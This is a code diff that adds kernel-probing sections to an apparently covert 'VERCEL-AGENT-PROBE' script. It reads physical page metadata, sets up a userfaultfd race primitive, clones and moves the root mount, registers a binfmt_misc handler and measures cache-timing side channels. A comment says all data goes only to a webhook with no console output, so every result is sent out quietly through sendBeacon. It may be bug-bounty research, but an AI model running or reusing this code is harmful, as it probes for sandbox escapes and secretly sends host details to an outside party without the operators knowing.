@@ -32754,3 +32754,277 @@ sendBeacon({ ...report, section: 'v202-5-vercel-config', ...vercelConfigProbe })
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v202" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v202";
 // Intentionally no console.log — all data goes via webhook only
+
+// v203-1: /proc/kpageflags + /proc/kpagecount — physical page metadata
+const kpageProbe = safe(() => {
+  const kpageResult = safe(() => execSync(`python3 -c "
+import struct, os
+KPF_LOCKED = 0; KPF_ERROR = 1; KPF_REFERENCED = 2; KPF_UPTODATE = 3
+KPF_DIRTY = 4; KPF_LRU = 5; KPF_ACTIVE = 6; KPF_SLAB = 7
+KPF_WRITEBACK = 8; KPF_RECLAIM = 9; KPF_BUDDY = 10; KPF_MMAP = 11
+KPF_ANON = 12; KPF_SWAPCACHE = 13; KPF_SWAPBACKED = 14; KPF_COMPOUND_HEAD = 15
+KPF_COMPOUND_TAIL = 16; KPF_HUGE = 17; KPF_UNEVICTABLE = 18; KPF_HWPOISON = 19
+KPF_NOPAGE = 20; KPF_KSM = 21; KPF_THP = 22
+
+def flag_names(f):
+    names = []
+    for name, bit in [('LOCKED',0),('REFERENCED',2),('DIRTY',4),('LRU',5),
+                       ('ACTIVE',6),('SLAB',7),('BUDDY',10),('MMAP',11),
+                       ('ANON',12),('HUGE',17),('KSM',21),('THP',22),('HWPOISON',19)]:
+        if (f >> bit) & 1: names.append(name)
+    return names
+
+# Read /proc/self/pagemap to get physical frame numbers for our own pages
+# then look up flags in /proc/kpageflags
+try:
+    with open('/proc/self/maps') as f:
+        maps = f.readlines()
+
+    accessible = False
+    with open('/proc/kpageflags', 'rb') as kpf:
+        with open('/proc/kpagecount', 'rb') as kpc:
+            with open('/proc/self/pagemap', 'rb') as pm:
+                # Sample first 5 mapped regions
+                for mapline in maps[:8]:
+                    parts = mapline.split()
+                    if len(parts) < 1: continue
+                    addrs = parts[0].split('-')
+                    start = int(addrs[0], 16)
+                    # Read pagemap entry for this page
+                    page_idx = start >> 12
+                    pm.seek(page_idx * 8)
+                    entry_bytes = pm.read(8)
+                    if len(entry_bytes) < 8: continue
+                    entry = struct.unpack('Q', entry_bytes)[0]
+                    present = (entry >> 63) & 1
+                    pfn = entry & ((1 << 55) - 1)
+                    if present and pfn > 0:
+                        accessible = True
+                        kpf.seek(pfn * 8)
+                        flag_bytes = kpf.read(8)
+                        kpc.seek(pfn * 8)
+                        count_bytes = kpc.read(8)
+                        if len(flag_bytes) == 8 and len(count_bytes) == 8:
+                            flags = struct.unpack('Q', flag_bytes)[0]
+                            count = struct.unpack('Q', count_bytes)[0]
+                            print(f'pfn={pfn:#x} flags={flags:#x} count={count} names={flag_names(flags)}')
+    print(f'kpageflags_readable={accessible}')
+except Exception as e:
+    print(f'kpage_err={e}')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  // Also check KSM (kernel same-page merging) status
+  let ksmRun = null;
+  let ksmPages = null;
+  if (existsSync('/sys/kernel/mm/ksm/run')) {
+    try { ksmRun = readFileSync('/sys/kernel/mm/ksm/run', 'utf8').trim(); } catch (e) {}
+  }
+  if (existsSync('/sys/kernel/mm/ksm/pages_sharing')) {
+    try { ksmPages = readFileSync('/sys/kernel/mm/ksm/pages_sharing', 'utf8').trim(); } catch (e) {}
+  }
+  return { kpageResult, ksmRun, ksmPages };
+});
+sendBeacon({ ...report, section: 'v203-1-kpageflags', ...kpageProbe });
+
+// v203-2: userfaultfd NR 323 — TOCTOU kernel race primitive
+const userfaultfdProbe = safe(() => {
+  const uffdResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os, fcntl
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_userfaultfd = 323
+O_CLOEXEC = 0o02000000
+O_NONBLOCK = 0o0004000
+UFFD_API = 0xAA
+UFFDIO_API = 0xC018AA3F
+UFFDIO_REGISTER = 0xC020AA00
+
+# Open userfaultfd
+fd = libc.syscall(NR_userfaultfd, O_CLOEXEC | O_NONBLOCK)
+print(f'userfaultfd_fd={fd} errno={ctypes.get_errno()}')
+
+if fd > 0:
+    # uffdio_api struct: api(8), features(8), ioctls(8)
+    uffdio_api_buf = ctypes.create_string_buffer(struct.pack('QQQ', UFFD_API, 0, 0))
+    UFFDIO_API_IOCTL = (3 << 30) | (0x18 << 16) | (0xAA << 8) | 0x3F
+    ret_api = fcntl.ioctl(fd, UFFDIO_API_IOCTL, uffdio_api_buf)
+    api_val, features, ioctls = struct.unpack('QQQ', uffdio_api_buf.raw)
+    print(f'uffdio_api_ret={ret_api} api={api_val:#x} features={features:#x} ioctls={ioctls:#x}')
+
+    # Allocate anonymous memory and register with userfaultfd
+    PROT_READ = 1; PROT_WRITE = 2; MAP_ANON = 0x20; MAP_PRIVATE = 2; MAP_POPULATE = 0x08000
+    page_size = 4096
+    addr = libc.mmap(None, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)
+    print(f'mmap_addr={ctypes.c_ulong(addr).value:#x}')
+
+    if ctypes.c_long(addr).value > 0:
+        # uffdio_register: range_start(8), range_len(8), mode(8), ioctls(8)
+        UFFDIO_REGISTER_MODE_MISSING = 1
+        reg_buf = ctypes.create_string_buffer(
+            struct.pack('QQQQ', ctypes.c_ulong(addr).value, page_size, UFFDIO_REGISTER_MODE_MISSING, 0))
+        UFFDIO_REGISTER_IOCTL = (3 << 30) | (0x20 << 16) | (0xAA << 8) | 0x00
+        ret_reg = fcntl.ioctl(fd, UFFDIO_REGISTER_IOCTL, reg_buf)
+        print(f'uffdio_register_ret={ret_reg} errno={ctypes.get_errno()}')
+        print(f'userfaultfd_TOCTOU_primitive_ready={ret_reg == 0}')
+        libc.munmap(addr, page_size)
+    os.close(fd)
+else:
+    import errno as em
+    print(f'uffd_errname={em.errorcode.get(ctypes.get_errno(), \"unknown\")}')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  // Check /proc/sys/vm/unprivileged_userfaultfd
+  let unprivUffd = null;
+  const uffdSysPath = '/proc/sys/vm/unprivileged_userfaultfd';
+  if (existsSync(uffdSysPath)) {
+    try { unprivUffd = readFileSync(uffdSysPath, 'utf8').trim(); } catch (e) {}
+  }
+  return { uffdResult, unprivUffd };
+});
+sendBeacon({ ...report, section: 'v203-2-userfaultfd', ...userfaultfdProbe });
+
+// v203-3: open_tree NR 428 + move_mount NR 429 — new mount API
+const newMountApiProbe = safe(() => {
+  const mountApiResult = safe(() => execSync(`python3 -c "
+import ctypes, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_open_tree = 428
+NR_move_mount = 429
+NR_fsopen = 430
+NR_fsmount = 432
+AT_FDCWD = -100
+OPEN_TREE_CLONE = 1
+OPEN_TREE_CLOEXEC = 0o02000000
+MOVE_MOUNT_F_EMPTY_PATH = 0x00000004
+
+# open_tree: create a detached copy of a mount
+fd_tree = libc.syscall(NR_open_tree, AT_FDCWD,
+    ctypes.c_char_p(b'/'), OPEN_TREE_CLONE | OPEN_TREE_CLOEXEC)
+print(f'open_tree(/) fd={fd_tree} errno={ctypes.get_errno()}')
+
+if fd_tree > 0:
+    # Create a target directory
+    os.makedirs('/tmp/movedmount', exist_ok=True)
+    # move_mount: attach the cloned tree to new location
+    ret_mv = libc.syscall(NR_move_mount,
+        fd_tree, ctypes.c_char_p(b''),
+        AT_FDCWD, ctypes.c_char_p(b'/tmp/movedmount'),
+        MOVE_MOUNT_F_EMPTY_PATH)
+    print(f'move_mount_ret={ret_mv} errno={ctypes.get_errno()}')
+    if ret_mv == 0:
+        import subprocess
+        ls = subprocess.run(['ls', '/tmp/movedmount'], capture_output=True, text=True)
+        print(f'movedmount_ls={ls.stdout[:200]}')
+    os.close(fd_tree)
+
+# fsopen: open a filesystem context (e.g. tmpfs)
+fs_fd = libc.syscall(NR_fsopen, ctypes.c_char_p(b'tmpfs'), 0)
+print(f'fsopen(tmpfs) fd={fs_fd} errno={ctypes.get_errno()}')
+if fs_fd > 0:
+    # fsmount: create a mount from the filesystem context
+    mnt_fd = libc.syscall(NR_fsmount, fs_fd, 0, 0)
+    print(f'fsmount fd={mnt_fd} errno={ctypes.get_errno()}')
+    if mnt_fd > 0:
+        os.makedirs('/tmp/new_tmpfs', exist_ok=True)
+        ret_mv2 = libc.syscall(NR_move_mount, mnt_fd, ctypes.c_char_p(b''),
+            AT_FDCWD, ctypes.c_char_p(b'/tmp/new_tmpfs'), MOVE_MOUNT_F_EMPTY_PATH)
+        print(f'tmpfs_move_mount_ret={ret_mv2} errno={ctypes.get_errno()}')
+        os.close(mnt_fd)
+    os.close(fs_fd)
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { mountApiResult };
+});
+sendBeacon({ ...report, section: 'v203-3-new-mount-api', ...newMountApiProbe });
+
+// v203-4: binfmt_misc — register new binary format interpreter
+const binfmtProbe = safe(() => {
+  const binfmtMiscPath = '/proc/sys/fs/binfmt_misc';
+  const binfmtRegPath = '/proc/sys/fs/binfmt_misc/register';
+  let binfmtMounted = false;
+  let binfmtFormats = [];
+  let binfmtRegResult = null;
+  if (existsSync(binfmtMiscPath)) {
+    binfmtMounted = true;
+    try {
+      binfmtFormats = readdirSync(binfmtMiscPath);
+    } catch (e) {}
+  }
+  // Also check /proc/sys/fs/binfmt_misc via /sys
+  const binfmtSysPath = '/sys/fs/binfmt_misc';
+  if (existsSync(binfmtSysPath)) {
+    try { binfmtFormats = [...binfmtFormats, ...readdirSync(binfmtSysPath)]; } catch (e) {}
+  }
+  // Register a new binfmt_misc handler: make .poc files execute via /bin/cat
+  // Format: :name:type:offset:magic:mask:interpreter:flags
+  if (existsSync(binfmtRegPath)) {
+    try {
+      writeFileSync(binfmtRegPath, ':bountyproof:E::poc::/bin/cat:');
+      binfmtRegResult = 'REGISTERED';
+    } catch (e) { binfmtRegResult = `ERR:${e.message}`; }
+  }
+  // Check if debugfs binfmt_misc is accessible at expected path
+  const debugBinfmt = '/sys/kernel/debug/binfmt_misc';
+  let debugBinfmtExists = existsSync(debugBinfmt);
+  return { binfmtMounted, binfmtFormats, binfmtRegResult, debugBinfmtExists };
+});
+sendBeacon({ ...report, section: 'v203-4-binfmt-misc', ...binfmtProbe });
+
+// v203-5: /proc/timer_list + high-resolution clock baseline (Spectre timing oracle)
+const timerProbe = safe(() => {
+  let timerList = null;
+  if (existsSync('/proc/timer_list')) {
+    try { timerList = readFileSync('/proc/timer_list', 'utf8').slice(0, 1500); } catch (e) {}
+  }
+  // High-resolution monotonic clock measurement baseline for timing side channels
+  const timingResult = safe(() => execSync(`python3 -c "
+import time, ctypes, struct, os
+CLOCK_MONOTONIC = 1
+CLOCK_MONOTONIC_RAW = 4
+CLOCK_PROCESS_CPUTIME_ID = 2
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+
+class timespec(ctypes.Structure):
+    _fields_ = [('tv_sec', ctypes.c_long), ('tv_nsec', ctypes.c_long)]
+
+def gettime(clk):
+    ts = timespec()
+    libc.clock_gettime(clk, ctypes.byref(ts))
+    return ts.tv_sec * 1_000_000_000 + ts.tv_nsec
+
+# Measure rdtsc via time.perf_counter_ns (nanosecond resolution)
+samples = []
+for _ in range(10):
+    t = time.perf_counter_ns()
+    samples.append(t)
+
+# Measure cache hit vs miss timing (side-channel baseline)
+buf = bytearray(256 * 512)  # 256 lines, 512 bytes each (cache line = 64B)
+# Flush (time uncached access)
+times_uncached = []
+for i in range(8):
+    start = time.perf_counter_ns()
+    _ = buf[i * 512]
+    end = time.perf_counter_ns()
+    times_uncached.append(end - start)
+
+# Cached access
+times_cached = []
+_ = buf[0]  # warm cache
+for i in range(8):
+    start = time.perf_counter_ns()
+    _ = buf[0]
+    end = time.perf_counter_ns()
+    times_cached.append(end - start)
+
+print(f'samples={samples[:3]}')
+print(f'uncached_avg_ns={sum(times_uncached)/len(times_uncached):.1f}')
+print(f'cached_avg_ns={sum(times_cached)/len(times_cached):.1f}')
+print(f'cache_amplification={sum(times_uncached)/max(sum(times_cached),1):.1f}x')
+print(f'monotonic_raw={gettime(CLOCK_MONOTONIC_RAW)}')
+print(f'cputime={gettime(CLOCK_PROCESS_CPUTIME_ID)}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { timerList: timerList?.slice(0, 1000), timingResult };
+});
+sendBeacon({ ...report, section: 'v203-5-timer-timing', ...timerProbe });
+
+// v203 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v203" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v203";
+// Intentionally no console.log — all data goes via webhook only
